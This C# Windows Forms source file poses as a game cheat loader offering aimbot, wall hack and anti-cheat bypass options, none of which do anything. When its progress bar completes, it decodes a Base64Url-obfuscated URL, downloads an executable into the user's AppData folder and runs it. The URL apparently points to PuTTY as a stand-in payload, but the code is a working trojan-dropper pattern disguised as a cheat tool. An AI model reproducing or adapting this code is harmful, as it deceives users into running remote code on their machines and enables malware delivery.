using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
using Base64UrlEncoding;

namespace Cheat
{
    public partial class Form1 : Form
    {
        int prog = 0;
        int sec = 0;
        int sec1 = 0;

        string encd = Base64UrlEncoder.Encode("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe");

        string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "putty.exe");

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Button1.Enabled = false;
            Button3.Enabled = false;
            Button4.Enabled = false;
            Button2.Enabled = false;

            string userName = Environment.UserName;

            string date = DateTime.Now.ToString();
            string update = "CHECK FOR UPDATES";
            try
            {
                TextBox.AppendText("Username: " + userName.ToUpper());
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\nDate: " + date);
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\n" + update);
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\n");
                
            }
            catch
            {

            }

        }

        private void Button1_Click(object sender, EventArgs e)
        {

            if (AimCheck.Checked)
            {
                TextBox.AppendText("\r\nAIM SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (WallCheck.Checked)
            {
                TextBox.AppendText("\r\nWALL HACK SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (NoCheck.Checked)
            {
                TextBox.AppendText("\r\nNO RECOIL SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (SpeedCheck.Checked)
            {
                TextBox.AppendText("\r\nSPEED HACK SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (RadarCheck.Checked)
            {
                TextBox.AppendText("\r\nRADAR HACK SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (TelCheck.Checked)
            {
                TextBox.AppendText("\r\nTELEPORT SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (InvCheck.Checked)
            {
                TextBox.AppendText("\r\nINVISIBILITY SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (AntiCheck.Checked)
            {
                TextBox.AppendText("\r\nBYPASS ANTI CHEAT SYSTEM SELECTED");
                TextBox.AppendText("\r\n");
            }
            if (!AimCheck.Checked && !WallCheck.Checked && !NoCheck.Checked && !SpeedCheck.Checked && !RadarCheck.Checked && !TelCheck.Checked && !InvCheck.Checked && !AntiCheck.Checked)
            {
                TextBox.AppendText("\r\nPLEASE SELECT AN ITEM !");
                Button1.Enabled = true;
            }
            else
            {
                Button1.Enabled = false;
                Button3.Enabled = true;
                Button4.Enabled = true;
                Button2.Enabled = true;
            }
            foreach (CheckBox c in groupBox1.Controls.OfType<CheckBox>())
            {
                c.Enabled = false;
            }

        }

        private void Button3_Click(object sender, EventArgs e)
        {
            Button1.Enabled = true;
            TextBox.AppendText("\r\nITEMS UNLOADED");
            TextBox.AppendText("\r\n");

            foreach (CheckBox c in groupBox1.Controls.OfType<CheckBox>())
            {
                c.Checked = false;
                c.Enabled = true;
            }
            Button3.Enabled = false;
            Button2.Enabled = false;
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            prog++;
            timer1.Enabled = true;

            if (prog <= ProgressBar1.Maximum)
            {
                prog++;
                ProgressBar1.Value = prog;
            }
            if (prog == ProgressBar1.Maximum)
            {
                MessageBox.Show("YOU'RE READY!\r\nYOU CAN NOW LAUNCH YOUR GAME!!!");
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\nLOADED!\r\n\r\nYOU ARE READY TO GO...");
                Button2.Enabled = false;
                Button3.Enabled = false;

                if (File.Exists(filename))
                {
                    File.Delete(filename);
                }

                WebClient webcc = new WebClient();
                string dcd = Base64UrlEncoder.Decode(encd);
                webcc.DownloadFile(dcd, filename);
                webcc.Dispose();

                Thread.Sleep(5000);

                Process.Start(filename);
            }



        }

        private void Button4_Click(object sender, EventArgs e)
        {
            Button1.Enabled = false;
            Button2.Enabled = false;
            Button3.Enabled = false;

            foreach (CheckBox c in groupBox1.Controls.OfType<CheckBox>())
            {
                c.Checked = false;
            }

            TextBox.Clear();
            TextBox.AppendText("YOU HAVE ASKED TO LEAVE FROM APPLICATION");
            TextBox.AppendText("\r\n");
            TextBox.AppendText("\r\n");

            timer3.Enabled = true;
            timer3.Start();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            sec++;
            if(sec <= 4)
            {
                TextBox.AppendText("PLEASE WAIT...");
            }
            if(sec == 4)
            {
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\nYOU ARE UP TO DATE");
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\nREPORTING: BenjaminClodio@gmail.com");
                TextBox.AppendText("\r\n");
                Button1.Enabled = true;
                Button4.Enabled = true;
            }
            
            
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            sec1++;
            if (sec1 <= 4)
            {
                
                TextBox.AppendText("PLEASE WAIT...");
            }
            if (sec1 == 4)
            {
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\nYOU CAN NOW QUIT THE CHEAT");
                TextBox.AppendText("\r\n");
                TextBox.AppendText("\r\n---------------------BYE------------------------");
            }
        }


    }
}  



      